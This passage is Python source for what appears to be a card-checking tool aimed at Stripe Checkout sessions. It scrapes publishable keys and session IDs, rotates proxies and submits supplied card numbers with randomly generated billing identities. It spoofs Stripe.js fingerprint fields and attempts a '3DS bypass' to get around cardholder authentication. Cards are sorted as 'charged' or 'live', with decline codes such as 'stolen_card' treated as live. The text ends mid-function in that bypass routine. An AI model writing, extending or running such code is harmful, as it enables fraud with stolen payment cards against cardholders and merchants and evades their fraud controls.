import httpx
import asyncio
import time
import random
import string
import json
import re
import os
import logging
import base64

logging.basicConfig(level=logging.INFO, format='%(name)s: %(message)s')
logger = logging.getLogger("stripe_co")
logger.setLevel(logging.INFO)

STRIPE_API = "https://api.stripe.com/v1"
PROXY_FILE = os.path.join(os.path.dirname(os.path.dirname(__file__)), "proxy.txt")

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"

LIVE_DECLINE_CODES = [
    "insufficient_funds", "do_not_honor", "lost_card", "stolen_card",
    "pickup_card", "restricted_card", "security_violation",
    "incorrect_cvc", "invalid_cvc", "incorrect_zip",
    "card_velocity_exceeded", "withdrawal_count_limit_exceeded",
    "try_again_later", "not_permitted", "generic_decline",
]


def _random_guid():
    return "".join(random.choices(string.hexdigits.lower(), k=32))


def _random_email():
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=10)) + "@gmail.com"


def _random_name():
    firsts = ["James", "John", "Michael", "William", "David", "Robert", "Thomas", "Charles"]
    lasts = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Taylor", "Wilson", "Davies"]
    return random.choice(firsts), random.choice(lasts)


def _get_proxy():
    try:
        if os.path.exists(PROXY_FILE):
            with open(PROXY_FILE, "r") as f:
                lines = [l.strip() for l in f if l.strip()]
            if lines:
                raw = random.choice(lines)
                parts = raw.split(":")
                if len(parts) == 4:
                    host, port, user, pwd = parts
                    return f"http://{user}:{pwd}@{host}:{port}"
                elif len(parts) == 2:
                    return f"http://{parts[0]}:{parts[1]}"
    except Exception:
        pass
    return None


def parse_checkout_url(url):
    url = url.strip()
    sid = _extract_session_id(url)
    if sid:
        return sid
    if 'checkout.stripe.com' in url or 'pay/' in url or 'c/pay/' in url:
        return url
    return None


def _extract_session_id(text):
    all_sids = re.findall(r'(cs_(?:live|test)_[a-zA-Z0-9_\-\.]+[a-zA-Z0-9])', text)
    if all_sids:
        return max(all_sids, key=len)
    return None


def _extract_all_session_ids(text):
    return re.findall(r'(cs_(?:live|test)_[a-zA-Z0-9_\-\.]+[a-zA-Z0-9])', text)


def _decode_stripe_fragment(fragment):
    import base64
    import urllib.parse
    if not fragment:
        return None
    frag = fragment.lstrip('#')
    if not frag:
        return None

    try:
        url_decoded = urllib.parse.unquote(frag)
        padded = url_decoded + '=' * (4 - len(url_decoded) % 4) if len(url_decoded) % 4 else url_decoded
        raw = base64.b64decode(padded)
        decoded = ''.join(chr(b ^ 5) for b in raw).strip()
        logger.info(f"Fragment decoded ({len(decoded)} chars): {decoded[:120]}...")
        try:
            data = json.loads(decoded)
            return data
        except json.JSONDecodeError:
            logger.warning(f"Fragment decoded but not valid JSON: {decoded[:200]}")
            return {"_raw": decoded}
    except Exception as e:
        logger.warning(f"Fragment decode failed: {e}")
        return None


def _extract_amount_from_pp(pp_data):
    amount = None

    ts = pp_data.get("total_summary")
    if isinstance(ts, dict):
        for ts_key in ("due", "total", "subtotal", "amount"):
            val = ts.get(ts_key)
            if isinstance(val, (int, float)) and val is not True and val >= 0:
                amount = int(val)
                logger.info(f"Got amount from total_summary.{ts_key}: {amount}")
                break

    if amount is None:
        pi = pp_data.get("payment_intent")
        if isinstance(pi, dict):
            raw = pi.get("amount")
            if isinstance(raw, (int, float)) and raw is not True:
                amount = int(raw)

    if amount is None:
        si = pp_data.get("setup_intent")
        if isinstance(si, dict):
            amount = 0

    if amount is None:
        for key in ("amount_total", "amount_subtotal"):
            val = pp_data.get(key)
            if isinstance(val, (int, float)) and val is not True:
                amount = int(val)
                break

    if amount is None:
        recurring = pp_data.get("recurring_details")
        if isinstance(recurring, dict):
            for rkey in ("total", "subtotal"):
                val = recurring.get(rkey)
                if isinstance(val, (int, float)) and val is not True and val > 0:
                    amount = int(val)
                    logger.info(f"Got amount from recurring_details.{rkey}: {amount}")
                    break

    if amount is None:
        line_items = pp_data.get("line_items", [])
        if isinstance(line_items, list):
            total = 0
            found_any = False
            for item in line_items:
                if isinstance(item, dict):
                    for akey in ("amount_total", "amount", "amount_subtotal"):
                        val = item.get(akey)
                        if isinstance(val, (int, float)) and val is not True:
                            total += int(val)
                            found_any = True
                            break
            if found_any:
                amount = total
                logger.info(f"Got amount from line_items: {amount}")

    if amount is None:
        lig = pp_data.get("line_item_group")
        if isinstance(lig, dict):
            for lig_key in ("total", "subtotal", "amount"):
                val = lig.get(lig_key)
                if isinstance(val, (int, float)) and val is not True and val > 0:
                    amount = int(val)
                    logger.info(f"Got amount from line_item_group.{lig_key}: {amount}")
                    break
            if amount is None:
                lig_items = lig.get("line_items", [])
                if isinstance(lig_items, list):
                    lig_total = 0
                    lig_found = False
                    for item in lig_items:
                        if isinstance(item, dict):
                            for akey in ("amount_total", "amount", "amount_subtotal"):
                                val = item.get(akey)
                                if isinstance(val, (int, float)) and val is not True:
                                    lig_total += int(val)
                                    lig_found = True
                                    break
                    if lig_found:
                        amount = lig_total
                        logger.info(f"Got amount from line_item_group items: {amount}")

    if amount is None:
        deep_amount = _deep_find(pp_data, "amount")
        if isinstance(deep_amount, (int, float)) and deep_amount is not True and deep_amount > 0:
            amount = int(deep_amount)
            logger.info(f"Got amount via deep search: {amount}")

    return amount


async def _fetch_checkout_info(client, checkout_url):
    fragment = ""
    if '#' in checkout_url:
        url_no_frag, fragment = checkout_url.split('#', 1)
    else:
        url_no_frag = checkout_url

    if url_no_frag.startswith('cs_'):
        full_url = f"https://checkout.stripe.com/c/pay/{url_no_frag}"
    else:
        full_url = url_no_frag

    logger.info(f"Fetching checkout: url={full_url[:120]}, has_fragment={bool(fragment)}, frag_len={len(fragment)}")

    headers = {
        "User-Agent": UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
    }

    try:
        resp = await client.get(full_url, headers=headers, follow_redirects=True, timeout=20)
        if resp.status_code == 407:
            logger.error("Failed to load checkout: 407 Proxy Authentication Required")
            return None, "Failed to load checkout: 407 Proxy Authentication Required"
        if resp.status_code == 403:
            logger.error("Failed to load checkout: 403 Forbidden")
            return None, "Failed to load checkout: 403 Forbidden"
        html = resp.text
        final_url = str(resp.url)
        logger.info(f"Checkout page loaded: status={resp.status_code}, final_url={final_url[:120]}, html_len={len(html)}")
    except Exception as e:
        logger.error(f"Failed to load checkout: {e}")
        return None, f"Failed to load checkout: {str(e)[:60]}"

    all_candidates = set()

    url_sids = _extract_all_session_ids(checkout_url)
    all_candidates.update(url_sids)

    final_sids = _extract_all_session_ids(final_url)
    all_candidates.update(final_sids)

    html_sids = _extract_all_session_ids(html)
    all_candidates.update(html_sids)

    frag_data = None
    frag_pk = None
    if fragment:
        frag_data = _decode_stripe_fragment(fragment)
        if frag_data and isinstance(frag_data, dict):
            frag_pk = frag_data.get("apiKey")
            if frag_pk:
                logger.info(f"Got PK from fragment: {frag_pk[:30]}...")
            frag_raw = frag_data.get("_raw", "")
            if frag_raw:
                frag_sids = _extract_all_session_ids(frag_raw)
                all_candidates.update(frag_sids)

    session_id = max(all_candidates, key=len) if all_candidates else None

    logger.info(f"Session ID candidates ({len(all_candidates)}): {[f'{s[:25]}...({len(s)})' for s in all_candidates]}")
    logger.info(f"Selected session ID ({len(session_id) if session_id else 0} chars): {session_id[:50] if session_id else 'None'}")

    pk = frag_pk

    if not pk:
        pk_patterns = [
            r'"publishableKey"\s*:\s*"(pk_(?:live|test)_[a-zA-Z0-9]+)"',
            r'"apiKey"\s*:\s*"(pk_(?:live|test)_[a-zA-Z0-9]+)"',
            r'"key"\s*:\s*"(pk_(?:live|test)_[a-zA-Z0-9]+)"',
            r'(pk_(?:live|test)_[a-zA-Z0-9]{20,})',
        ]
        session_mode = "live" if session_id and "cs_live_" in session_id else "test"
        all_pks = set()
        for pat in pk_patterns:
            for m_pk in re.finditer(pat, html):
                found = m_pk.group(1) if m_pk.lastindex else m_pk.group(0)
                all_pks.add(found)

        matching = [p for p in all_pks if f"pk_{session_mode}_" in p]
        if matching:
            pk = max(matching, key=len)
            logger.info(f"Using {session_mode} PK from HTML: {pk[:30]}...")
        elif all_pks:
            pk = max(all_pks, key=len)
            logger.warning(f"No {session_mode} PK found, using fallback: {pk[:30]}...")

    if not pk:
        logger.error(f"No PK found anywhere")
        return None, "Could not find Stripe publishable key"

    if not session_id:
        logger.error("No session ID found anywhere")
        return None, "Could not find checkout session ID"

    amount = None
    currency = None
    presentment_currency = None
    merchant = None
    pp_data = {}

    try:
        pp_headers = {
            "User-Agent": UA,
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://checkout.stripe.com",
            "Referer": "https://checkout.stripe.com/",
            "Accept": "application/json",
        }
        pp_resp = await client.get(
            f"{STRIPE_API}/payment_pages/{session_id}?key={pk}",
            headers=pp_headers,
            timeout=15,
        )
        pp_data = pp_resp.json()
        logger.info(f"Payment page info: status={pp_resp.status_code}, keys={list(pp_data.keys())[:10]}")

        if "error" not in pp_data:
            amount = _extract_amount_from_pp(pp_data)

            acct = pp_data.get("account_settings", {})
            merchant = acct.get("display_name") or acct.get("order_summary_display_name") or acct.get("business_name") or acct.get("name")

            if not merchant:
                line_items = pp_data.get("line_items", pp_data.get("display_items", []))
                if isinstance(line_items, list):
                    for li in line_items:
                        if isinstance(li, dict):
                            prod = li.get("product") or li.get("custom") or {}
                            if isinstance(prod, dict):
                                merchant = prod.get("name") or prod.get("description")
                                if merchant:
                                    break

            top_currency = pp_data.get("currency", "").upper() if pp_data.get("currency") else None
            pi = pp_data.get("payment_intent")
            pi_currency = None
            if isinstance(pi, dict):
                pi_currency = pi.get("currency", "").upper() if pi.get("currency") else None

            currency = top_currency or pi_currency
            if top_currency:
                presentment_currency = top_currency
        else:
            logger.warning(f"Payment page info error: {pp_data['error']}")
    except Exception as e:
        logger.warning(f"Payment page info fetch failed: {e}")

    if amount is None:
        amount_patterns = [
            r'"amount"\s*:\s*(\d+)',
            r'"total"\s*:\s*(\d+)',
            r'"amount_total"\s*:\s*(\d+)',
            r'"unitAmount"\s*:\s*(\d+)',
        ]
        for pat in amount_patterns:
            m = re.search(pat, html)
            if m:
                try:
                    parsed = int(m.group(1))
                    if parsed > 0:
                        amount = parsed
                        logger.info(f"Got amount from HTML pattern '{pat}': {amount}")
                        break
                except (ValueError, IndexError):
                    pass

    stripe_js_version = None
    ver_match = re.search(r'STRIPE_JS_BUILD_SALT\s+([a-f0-9]{10,})\*/', html)
    if ver_match:
        stripe_js_version = ver_match.group(1)
        logger.info(f"Stripe.js version: {stripe_js_version}")

    billing_required = False
    customer_email = None
    success_url = ""
    if "error" not in pp_data:
        billing_required = pp_data.get("billing_address_collection") == "required"
        customer_email = pp_data.get("customer_email")
        success_url = pp_data.get("success_url", "") or ""

    if not merchant:
        title_match = re.search(r'<title[^>]*>([^<]+)</title>', html, re.IGNORECASE)
        if title_match:
            title_text = title_match.group(1).strip()
            for strip_word in ["Checkout", "Payment", "Stripe", "- ", "| "]:
                title_text = title_text.replace(strip_word, "").strip()
            if title_text and len(title_text) > 1:
                merchant = title_text[:60]

    logger.info(f"Checkout info: pk={pk[:20]}..., session={session_id[:40]}..., amount={amount}, currency={currency}, merchant={merchant}")

    return {
        "pk": pk,
        "session_id": session_id,
        "amount": amount,
        "currency": presentment_currency or currency,
        "merchant": merchant,
        "success_url": success_url,
        "stripe_js_version": stripe_js_version,
        "billing_required": billing_required,
        "customer_email": customer_email,
    }, None


def _deep_find(obj, key):
    if isinstance(obj, dict):
        if key in obj:
            return obj[key]
        for v in obj.values():
            result = _deep_find(v, key)
            if result is not None:
                return result
    elif isinstance(obj, list):
        for item in obj:
            result = _deep_find(item, key)
            if result is not None:
                return result
    return None


async def _create_payment_method(client, pk, cc, mm, yy, cvv, stripe_js_version=None):
    if len(yy) == 2:
        exp_year = f"20{yy}"
    else:
        exp_year = yy

    first, last = _random_name()
    email = _random_email()
    city, state, postal = random.choice(US_CITIES)
    street_num = random.randint(100, 9999)
    street = random.choice(US_STREETS)

    js_ver = stripe_js_version or "5e27053bf5"
    pua = f"stripe.js/{js_ver}; stripe-js-v3/{js_ver}; checkout"

    headers = {
        "User-Agent": UA,
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://checkout.stripe.com",
        "Referer": "https://checkout.stripe.com/",
        "Accept": "application/json",
    }

    pm_data = {
        "type": "card",
        "card[number]": cc,
        "card[exp_month]": mm.zfill(2),
        "card[exp_year]": exp_year,
        "card[cvc]": cvv,
        "billing_details[name]": f"{first} {last}",
        "billing_details[email]": email,
        "billing_details[address][line1]": f"{street_num} {street}",
        "billing_details[address][city]": city,
        "billing_details[address][state]": state,
        "billing_details[address][country]": "US",
        "billing_details[address][postal_code]": postal,
        "guid": _random_guid(),
        "muid": _random_guid(),
        "sid": _random_guid(),
        "payment_user_agent": pua,
        "time_on_page": str(random.randint(30000, 120000)),
        "key": pk,
    }

    try:
        resp = await client.post(
            f"{STRIPE_API}/payment_methods",
            data=pm_data,
            headers=headers,
            timeout=20,
        )
        data = resp.json()
    except Exception as e:
        logger.error(f"PM creation error: {e}")
        return None, f"PM request failed: {str(e)[:50]}", None

    if "error" in data:
        err = data["error"]
        code = err.get("code", "unknown")
        msg = err.get("message", "")
        logger.info(f"PM error: {code} - {msg}")
        return None, f"{code}: {msg[:80]}", None

    pm_id = data.get("id")
    if not pm_id:
        return None, "No PM ID returned", None

    card = data.get("card", {})
    brand = card.get("brand", "?").upper()
    last4 = card.get("last4", "????")
    funding = card.get("funding", "?").upper()
    country = card.get("country", "??")
    card_info = f"{brand} {funding} | {country} | {last4}"

    return pm_id, None, card_info


def _classify_confirm_error(error_data, intent_type="payment"):
    code = error_data.get("code", "")
    decline = error_data.get("decline_code", "")
    msg = error_data.get("message", "")

    if decline in LIVE_DECLINE_CODES or code in LIVE_DECLINE_CODES:
        return "live_declined", decline or code
    if code == "card_declined":
        return "declined", decline or "card_declined"
    if code == "expired_card":
        return "declined", "expired_card"
    if code == "processing_error":
        return "declined", "processing_error"
    if code == "payment_intent_authentication_failure":
        return "declined", "3DS authentication failed"
    return "declined", f"{code}: {msg[:60]}"


US_CITIES = [
    ("Portland", "OR", "97201"), ("Salem", "OR", "97301"), ("Eugene", "OR", "97401"),
    ("Bend", "OR", "97701"), ("Billings", "MT", "59101"), ("Helena", "MT", "59601"),
    ("Missoula", "MT", "59801"), ("Wilmington", "DE", "19801"), ("Dover", "DE", "19901"),
    ("Manchester", "NH", "03101"), ("Concord", "NH", "03301"), ("Nashua", "NH", "03060"),
    ("Anchorage", "AK", "99501"), ("Fairbanks", "AK", "99701"), ("Juneau", "AK", "99801"),
]

US_STREETS = [
    "Main St", "Oak Ave", "Elm St", "Park Blvd", "Cedar Ln", "Maple Dr",
    "Washington St", "Lake Ave", "Hill Rd", "Valley Way", "Pine St", "River Rd",
]


async def _confirm_via_payment_pages(client, pk, session_id, pm_id, amount=None,
                                     cc=None, mm=None, yy=None, cvv=None,
                                     stripe_js_version=None, billing_required=False,
                                     customer_email=None, session_info=None):
    headers = {
        "User-Agent": UA,
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://checkout.stripe.com",
        "Referer": "https://checkout.stripe.com/",
        "Accept": "application/json",
    }

    first, last = _random_name()
    email = customer_email or _random_email()
    city, state, postal = random.choice(US_CITIES)
    street_num = random.randint(100, 9999)
    street = random.choice(US_STREETS)

    js_ver = stripe_js_version or "5e27053bf5"
    pua = f"stripe.js/{js_ver}; stripe-js-v3/{js_ver}; checkout"

    if cc and mm and yy and cvv:
        exp_year = f"20{yy}" if len(yy) == 2 else yy
        confirm_data = {
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": cc,
            "payment_method_data[card][exp_month]": mm.zfill(2),
            "payment_method_data[card][exp_year]": exp_year,
            "payment_method_data[card][cvc]": cvv,
            "payment_method_data[billing_details][name]": f"{first} {last}",
            "payment_method_data[billing_details][email]": email,
            "payment_method_data[billing_details][address][line1]": f"{street_num} {street}",
            "payment_method_data[billing_details][address][city]": city,
            "payment_method_data[billing_details][address][state]": state,
            "payment_method_data[billing_details][address][country]": "US",
            "payment_method_data[billing_details][address][postal_code]": postal,
            "payment_method_data[guid]": _random_guid(),
            "payment_method_data[muid]": _random_guid(),
            "payment_method_data[sid]": _random_guid(),
            "payment_method_data[payment_user_agent]": pua,
            "payment_method_data[time_on_page]": str(random.randint(30000, 120000)),
            "expected_payment_method_type": "card",
            "key": pk,
        }
    else:
        confirm_data = {
            "payment_method": pm_id,
            "expected_payment_method_type": "card",
            "key": pk,
        }

    if isinstance(amount, (int, float)) and amount is not True:
        confirm_data["expected_amount"] = str(int(amount))
    else:
        logger.info("Amount still unknown at confirm time, fetching from payment_pages...")
        try:
            pp_resp = await client.get(
                f"{STRIPE_API}/payment_pages/{session_id}?key={pk}",
                headers=headers,
                timeout=15,
            )
            pp_data = pp_resp.json()
            if "error" not in pp_data:
                recovered_amount = _extract_amount_from_pp(pp_data)
                if recovered_amount is not None:
                    confirm_data["expected_amount"] = str(recovered_amount)
                    logger.info(f"Recovered amount at confirm time: {recovered_amount}")
                else:
                    logger.warning("Could not recover amount at confirm time")
            else:
                logger.warning(f"Payment page error at confirm: {pp_data['error']}")
        except Exception as e:
            logger.warning(f"Amount fetch in confirm failed: {e}")

    async def _do_confirm(cd):
        try:
            r = await client.post(
                f"{STRIPE_API}/payment_pages/{session_id}/confirm",
                data=cd,
                headers=headers,
                timeout=30,
            )
            return r.json()
        except Exception as exc:
            logger.error(f"Payment page confirm error: {exc}")
            return None

    data = await _do_confirm(confirm_data)
    if data is None:
        return "error", "Confirm request failed"

    if "error" in data:
        err = data["error"]
        code = err.get("code", "")
        msg = err.get("message", "")

        if "tax_location_invalid" in code or "tax_location" in code:
            logger.info("Tax location invalid, retrying with tax-free state (OR)...")
            tax_free = [
                ("Portland", "OR", "97201"), ("Salem", "OR", "97301"),
                ("Billings", "MT", "59101"), ("Wilmington", "DE", "19801"),
                ("Manchester", "NH", "03101"),
            ]
            city, state, postal = random.choice(tax_free)
            for k in list(confirm_data.keys()):
                if "address" in k:
                    if "city" in k:
                        confirm_data[k] = city
                    elif "state" in k:
                        confirm_data[k] = state
                    elif "postal_code" in k:
                        confirm_data[k] = postal
                    elif "country" in k:
                        confirm_data[k] = "US"
                    elif "line1" in k:
                        confirm_data[k] = f"{random.randint(100,9999)} {random.choice(US_STREETS)}"
            data = await _do_confirm(confirm_data)
            if data is None:
                return "error", "Retry confirm failed"

        if "error" in data:
            err = data["error"]
            code = err.get("code", "")
            msg = err.get("message", "")

        if "amount_mismatch" in code or "amount_mismatch" in msg.lower() or "does not match" in msg.lower():
            logger.info("Amount mismatch detected, re-fetching correct amount...")
            try:
                pp_resp = await client.get(
                    f"{STRIPE_API}/payment_pages/{session_id}?key={pk}",
                    headers=headers,
                    timeout=15,
                )
                pp_data = pp_resp.json()
                if "error" not in pp_data:
                    correct_amount = _extract_amount_from_pp(pp_data)
                    if correct_amount is not None:
                        confirm_data["expected_amount"] = str(correct_amount)
                        logger.info(f"Retrying with corrected amount (from re-fetch): {correct_amount}")
                        data = await _do_confirm(confirm_data)
                        if data is None:
                            return "error", "Retry confirm failed"

                    if "error" in data and "amount_mismatch" in data.get("error", {}).get("code", ""):
                        ts = pp_data.get("total_summary", {})
                        due = ts.get("due")
                        ts_total = ts.get("total")
                        for candidate_name, candidate in [("due", due), ("total_summary.total", ts_total)]:
                            if isinstance(candidate, (int, float)) and candidate is not True and candidate >= 0:
                                if str(int(candidate)) != confirm_data.get("expected_amount"):
                                    confirm_data["expected_amount"] = str(int(candidate))
                                    logger.info(f"Retrying with {candidate_name} amount: {candidate}")
                                    data = await _do_confirm(confirm_data)
                                    if data is None:
                                        return "error", "Retry confirm failed"
                                    if "error" not in data or "amount_mismatch" not in data.get("error", {}).get("code", ""):
                                        break

                    if "error" in data and "amount_mismatch" in data.get("error", {}).get("code", ""):
                        recurring = pp_data.get("recurring_details", {})
                        for rkey in ("total", "subtotal"):
                            val = recurring.get(rkey)
                            if isinstance(val, (int, float)) and val is not True and val > 0:
                                if str(int(val)) != confirm_data.get("expected_amount"):
                                    confirm_data["expected_amount"] = str(int(val))
                                    logger.info(f"Retrying with recurring_details.{rkey}: {val}")
                                    data = await _do_confirm(confirm_data)
                                    if data is None:
                                        return "error", "Retry confirm failed"
                                    if "error" not in data or "amount_mismatch" not in data.get("error", {}).get("code", ""):
                                        break

                    if "error" in data and "amount_mismatch" in data.get("error", {}).get("code", ""):
                        if "expected_amount" in confirm_data:
                            del confirm_data["expected_amount"]
                        logger.info("All amount retries failed, trying without expected_amount...")
                        data = await _do_confirm(confirm_data)
                        if data is None:
                            return "error", "Retry confirm failed"
                else:
                    logger.warning(f"Payment page error during amount re-fetch: {pp_data.get('error')}")
            except Exception as e:
                logger.warning(f"Amount mismatch retry failed: {e}")

    logger.info(f"Payment page confirm response: status={data.get('status', 'N/A')}, keys={list(data.keys())[:10]}")

    if "error" in data:
        err = data["error"]
        code = err.get("code", "")
        decline = err.get("decline_code", "")
        msg = err.get("message", "")

        if "expired" in msg.lower() or "completed" in msg.lower():
            return "error", "Checkout session expired/completed"

        if decline in LIVE_DECLINE_CODES or code in LIVE_DECLINE_CODES:
            return "live_declined", decline or code
        if code == "card_declined":
            return "declined", decline or "card_declined"

        return "declined", f"{code}: {msg[:60]}"

    status = data.get("status", "")
    payment_status = data.get("payment_status", "")

    if status in ("complete", "succeeded") or payment_status == "paid":
        return "charged", "Charged Successfully"

    pi = data.get("payment_intent")
    if isinstance(pi, dict):
        pi_status = pi.get("status", "")
        pi_amount = pi.get("amount")
        pi_currency = pi.get("currency", "")
        logger.info(f"Nested PI: status={pi_status}, amount={pi_amount}")
        if session_info is not None and pi_amount is not None:
            if not isinstance(session_info.get("amount"), (int, float)) or session_info["amount"] is True:
                session_info["amount"] = int(pi_amount)

        if pi_status == "succeeded":
            return "charged", "Charged Successfully"
        if pi_status == "requires_capture":
            return "charged", "Authorized (Capture Pending)"
        if pi_status == "processing":
            return "approved", "Processing - Not Yet Confirmed"

        if pi_status in ("requires_action", "requires_source_action"):
            pi_cs = pi.get("client_secret", "")
            pi_id_val = pi.get("id", "")
            if pi_cs and pi_id_val:
                na = pi.get("next_action", {}) or pi.get("next_source_action", {})
                sdk = na.get("use_stripe_sdk", {})
                pm_in_pi = pi.get("payment_method") or pi.get("source")
                logger.info(f"PI requires_action: sdk_type={sdk.get('type', 'N/A')}, has_pm={bool(pm_in_pi)}, na_keys={list(na.keys())}")
                logger.info("Fetching full PI for fresh 3DS data...")
                try:
                    full_pi_resp = await client.get(
                        f"{STRIPE_API}/payment_intents/{pi_id_val}",
                        params={"key": pk, "client_secret": pi_cs},
                        headers=headers,
                        timeout=15,
                    )
                    full_pi = full_pi_resp.json()
                    if full_pi.get("status") in ("requires_action", "requires_source_action") and not full_pi.get("error"):
                        full_sdk = full_pi.get("next_action", {}).get("use_stripe_sdk", {})
                        logger.info(f"Full PI fetched: sdk_type={full_sdk.get('type', 'N/A')}, source={full_sdk.get('three_d_secure_2_source', 'N/A')[:25]}")
                        pi = full_pi
                    elif full_pi.get("status") == "succeeded":
                        return "charged", "Charged Successfully"
                    elif full_pi.get("status") == "requires_capture":
                        return "charged", "Authorized (Capture Pending)"
                    elif full_pi.get("status") == "requires_payment_method":
                        last_error = full_pi.get("last_payment_error", {})
                        if last_error:
                            return _classify_confirm_error(last_error)
                        return "declined", "Payment method failed"
                except Exception as e:
                    logger.warning(f"Failed to fetch full PI: {e}")
            logger.info(f"PI requires 3DS, attempting bypass...")
            bypass_result = await _attempt_3ds_bypass(client, pk, pi, "payment_intent", stripe_js_version, is_checkout=True)
            if bypass_result:
                return bypass_result
            _pi_sdk_type = pi.get("next_action", {}).get("use_stripe_sdk", {}).get("type", "")
            logger.info("All PI 3DS bypass failed, polling for final status...")
            for _wait_i in range(4):
                await asyncio.sleep(2 + _wait_i)
                try:
                    final_resp = await client.get(
                        f"{STRIPE_API}/payment_intents/{pi_id_val}",
                        params={"key": pk, "client_secret": pi_cs},
                        headers=headers,
                        timeout=10,
                    )
                    final_data = final_resp.json()
                    final_status = final_data.get("status", "")
                    logger.info(f"Post-3DS PI poll {_wait_i+1}: status={final_status}")
                    if final_status in ("requires_payment_method", "requires_source"):
                        last_error = final_data.get("last_payment_error", {})
                        if last_error:
                            return _classify_confirm_error(last_error)
                        return "declined", "Payment method failed"
                    if final_status == "succeeded":
                        return "charged", "Charged Successfully"
                    if final_status == "requires_capture":
                        return "charged", "Authorized (Capture Pending)"
                    if final_status == "processing":
                        return "approved", "Processing - Not Yet Confirmed"
                    if final_status == "canceled":
                        return "declined", "Payment canceled"
                    if final_status in ("requires_action", "requires_source_action"):
                        continue
                except Exception as e:
                    logger.warning(f"Post-3DS PI poll {_wait_i+1} failed: {e}")
            if _pi_sdk_type == "intent_confirmation_challenge":
                return "live", "hCaptcha Challenge Required"
            return "live", "3DS Authentication Required"

        if pi_status in ("requires_payment_method", "requires_source"):
            last_error = pi.get("last_payment_error", {})
            if last_error:
                return _classify_confirm_error(last_error)
            return "declined", "Payment method failed"

    si = data.get("setup_intent")
    if isinstance(si, dict):
        si_status = si.get("status", "")
        logger.info(f"Nested SI: status={si_status}")

        if si_status == "succeeded":
            return "charged", "Setup Succeeded"
        if si_status == "requires_action":
            si_cs = si.get("client_secret", "")
            si_id = si.get("id", "")
            if si_cs and si_id:
                logger.info("Fetching full SI for fresh 3DS data...")
                try:
                    full_si_resp = await client.get(
                        f"{STRIPE_API}/setup_intents/{si_id}",
                        params={"key": pk, "client_secret": si_cs},
                        headers=headers,
                        timeout=15,
                    )
                    full_si = full_si_resp.json()
                    if full_si.get("status") == "requires_action" and not full_si.get("error"):
                        full_sdk = full_si.get("next_action", {}).get("use_stripe_sdk", {})
                        logger.info(f"Full SI fetched: sdk_type={full_sdk.get('type', 'N/A')}, source={full_sdk.get('three_d_secure_2_source', 'N/A')[:25]}")
                        si = full_si
                    elif full_si.get("status") == "succeeded":
                        return "charged", "Setup Succeeded"
                    elif full_si.get("status") == "requires_payment_method":
                        last_error = full_si.get("last_setup_error", {})
                        if last_error:
                            return _classify_confirm_error(last_error)
                        return "declined", "Setup failed"
                except Exception as e:
                    logger.warning(f"Failed to fetch full SI: {e}")
            logger.info(f"SI requires 3DS, attempting bypass...")
            bypass_result = await _attempt_3ds_bypass(client, pk, si, "setup_intent", stripe_js_version, is_checkout=True)
            if bypass_result:
                return bypass_result
            _si_sdk = si.get("next_action", {}).get("use_stripe_sdk", {})
            _si_sdk_type = _si_sdk.get("type", "")
            logger.info("All SI 3DS bypass failed, polling for final status...")
            for _wait_i in range(4):
                await asyncio.sleep(2 + _wait_i)
                try:
                    final_resp = await client.get(
                        f"{STRIPE_API}/setup_intents/{si_id}",
                        params={"key": pk, "client_secret": si_cs},
                        headers=headers,
                        timeout=10,
                    )
                    final_data = final_resp.json()
                    final_status = final_data.get("status", "")
                    logger.info(f"Post-3DS SI poll {_wait_i+1}: status={final_status}")
                    if final_status == "requires_payment_method":
                        last_error = final_data.get("last_setup_error", {})
                        if last_error:
                            return _classify_confirm_error(last_error)
                        return "declined", "Setup failed"
                    if final_status == "succeeded":
                        return "charged", "Setup Succeeded"
                    if final_status == "canceled":
                        return "declined", "Setup canceled"
                    if final_status == "requires_action":
                        continue
                except Exception as e:
                    logger.warning(f"Post-3DS SI poll {_wait_i+1} failed: {e}")
            if _si_sdk_type == "intent_confirmation_challenge":
                return "live", "hCaptcha Challenge Required"
            return "live", "3DS Authentication Required"
        if si_status == "requires_payment_method":
            last_error = si.get("last_setup_error", {})
            if last_error:
                return _classify_confirm_error(last_error)
            return "declined", "Setup failed"

    pi_cs = data.get("payment_intent_client_secret")
    if pi_cs:
        pi_result = await _check_intent_status(client, pk, pi_cs, pm_id, "payment_intent")
        if pi_result:
            return pi_result

    si_cs = data.get("setup_intent_client_secret")
    if si_cs:
        si_result = await _check_intent_status(client, pk, si_cs, pm_id, "setup_intent")
        if si_result:
            return si_result

    if status == "open":
        return "declined", "Payment failed (session open)"

    if status:
        return "declined", f"Status: {status}"

    return "declined", "Unknown response"


async def _attempt_3ds_bypass(client, pk, intent_data, intent_type, stripe_js_version=None, is_checkout=False):
    cs = intent_data.get("client_secret", "")
    intent_id = intent_data.get("id", "")
    pm = intent_data.get("payment_method") or intent_data.get("source")

    if isinstance(pm, dict):
        pm_id = pm.get("id", "")
    elif isinstance(pm, str):
        pm_id = pm
    else:
        pm_id = ""

    na = intent_data.get("next_action") or intent_data.get("next_source_action") or {}
    sdk = na.get("use_stripe_sdk", {})
    sdk_type = sdk.get("type", "")
    logger.info(f"3DS bypass entry: is_checkout={is_checkout}, sdk_type={sdk_type}, cs={bool(cs)}, id={intent_id[:25] if intent_id else 'N/A'}, pm={bool(pm_id)}")

    if not cs or not intent_id:
        logger.info(f"3DS bypass: missing critical data - cs={bool(cs)}, id={bool(intent_id)}")
        return None

    if not pm_id and not is_checkout:
        logger.info(f"3DS bypass: pm_id missing for non-checkout flow, skipping re-confirm attempts")
        return None

    js_ver = stripe_js_version or "5e27053bf5"

    headers = {
        "User-Agent": UA,
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://checkout.stripe.com",
        "Referer": "https://checkout.stripe.com/",
        "Accept": "application/json",
    }

    js_headers = {
        "User-Agent": UA,
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://js.stripe.com",
        "Referer": "https://js.stripe.com/",
        "Accept": "application/json",
    }

    if not is_checkout:
        if intent_type == "payment_intent":
